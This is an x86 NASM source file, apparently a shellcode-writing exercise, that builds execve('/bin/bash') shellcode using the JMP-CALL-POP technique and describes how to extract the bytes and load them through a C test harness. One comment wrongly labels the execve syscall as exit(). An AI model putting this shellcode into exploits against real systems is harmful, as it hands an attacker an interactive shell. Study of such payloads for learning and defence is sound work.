; Executable name : execve_01_bash_shell
; Version         : 1.0
; Created date    : 06/08/2020
; Last update     : 06/08/2020
; Author          : bigb0ss
; Description     : 1) This is to run "/bin/bash" using execve function
;                   2) This will leverage a technique called JMP-CALL-POP to read "/bin/bash" from the stack. 
;                   3) Once .nasm created --> Compile it
;                   4) Extract the shellcode using objdump
;                   5) Update the skeleton.c with the shellcode --> Compile it
;                   6) Run the program to see if we can successfully load "/bin/bash"
;
;                  
; ================================ Execve Layout ================================
; int execve(const char *filename, char *const argv[], char *const envp[]);
;            -------- EBX -------- ------- ECX ------- ------- EDX --------
;                      ⬇                                       ⬇
;               "/bin/bash, 0x0"            ⬇            "0x00000000"
;                            "Addr of /bin/bash, 0x00000000"
; ===============================================================================
;

global _start

section .text

_start:

        jmp short call_shellcode	      ; Doing a short jump to call "call_shellcode" label 
        

shellcode:
        
        pop esi				      ; POPing "/bin/bashABBBBCCCC" on the stack at ESI register
        
	
        ; Preparing for values to utilize for further execve layout usage
        xor ebx, ebx			      ; Making the EBX value to 0 for Null terminator for /bin/bash
        mov byte [esi +9], bl		      ; Moving 0 to "A" location
        mov dword [esi +10], esi	      ; Moving ESI address (DWORD) to "BBBB" location
        mov dword [esi +14], ebx	      ; Moving 0s to "CCCC" address


        ; Placing each value for execve usage
        lea ebx, [esi]			      ; Moving ESI to EBX location (= filename)
        lea ecx, [esi +10]		      ; Moving address of ESI to ECX (= argv[])
        lea edx, [esi +14]		      ; Moving 0s to EDX (= evnp[])
        
      	; exit() syscall
	xor eax, eax		              ; Set EAX to zero
  	mov al, 0xb	                      ; Adding "11" to AL (= lower byte of EAX)
	int 0x80


call_shellcode:

	call shellcode
	message db "/bin/bashABBBBCCCC"
        
        
        
        
        
